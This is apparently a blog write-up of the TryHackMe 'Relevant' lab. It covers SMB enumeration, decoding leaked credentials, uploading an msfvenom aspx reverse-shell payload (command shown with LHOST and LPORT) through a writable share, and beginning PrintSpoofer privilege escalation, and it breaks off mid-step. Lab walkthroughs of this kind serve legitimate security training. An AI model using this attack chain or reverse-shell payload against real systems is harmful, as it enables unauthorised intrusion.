## **<span style='color:#ff5555'>Website</span>**
***

The relevant website only shows default IIS windows server's page.

![]({{ "/images/thm/Relevant/website.png" | relative_url }})

## **<span style='color:#ff5555'>Fuzzing</span>**
***

Running `gobuster` on the website with unfortunate output.

![]({{ "/images/thm/Relevant/gobuster1.png" | relative_url }})

Since it's windows machine, we need to enumerate SMB based on nmap's result.

## **<span style='color:#ff5555'>Enumerating SMB</span>**
***

Using SMBClient to open SMB shares on the server.

![]({{ "/images/thm/Relevant/smb1.png" | relative_url }})

It shows the **nt4wrksv** share enabled, the next step is to connect with **nt4wrksv** and find out what we can get from it.

![]({{ "/images/thm/Relevant/smb2.png" | relative_url }})

Download the password.txt file stored in it.

The file consists of two base64 encoded credentials

![]({{ "/images/thm/Relevant/encoded1.png" | relative_url }})

After decoding the base64, it reveals credentials for Bob and Bill

![]({{ "/images/thm/Relevant/cred1.png" | relative_url }})

Having these credentials, we can attempt to use it to the target, using **psexec** to check which users is valid.

![]({{ "/images/thm/Relevant/bob.png" | relative_url }})

![]({{ "/images/thm/Relevant/bill.png" | relative_url }})


## **<span style='color:#ff5555'>Special Port</span>**
***

Based on nmap's scan, we also have open port on 49663 which running **Microsoft HTTPAPI httpd**

Running `gobuster` against port 49663 to check subdirectories in it.

![]({{ "/images/thm/Relevant/gobuster2.png" | relative_url }})

To validate that we are on the right path, try add passwords.txt that we found on SMB before.

![]({{ "/images/thm/Relevant/passwordstxt.png" | relative_url }})

It shows the same file that we found in SMB share, that means anything we put on SMB shares because we have write access, and knowing that IIS usually accept an aspx file, we need to craft it and we can download it on the webserver and gain access.

Craft the payload:
```terminal
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.62.230 LPORT=1337 -f aspx -o rhovelionz.aspx
```
Upload it to the smb share

![]({{ "/images/thm/Relevant/uploadtosmbshare.png" | relative_url }})

We need to start netcat listener and open the link on the browser, and we are in.

![]({{ "/images/thm/Relevant/netcat2.png" | relative_url }})

## **<span style='color:#ff5555'>Escalate to Administrator</span>**
***

There is an exploit to abuse SeImpersonatePrivilege token that is enabled, that means token impersonation could be used to escalate to the **administrator**.

![]({{ "/images/thm/Relevant/seimpersonate.png" | relative_url }})

We will be using `PrintSpoofer`, download it and tranfer the exploit file via SMB share.

![]({{ "/images/thm/Relevant/uploadprintspoofer.png" | relative_url }})

Executing the exploit with command with -i to interact with new process and -c cmd to run CMD after execution.
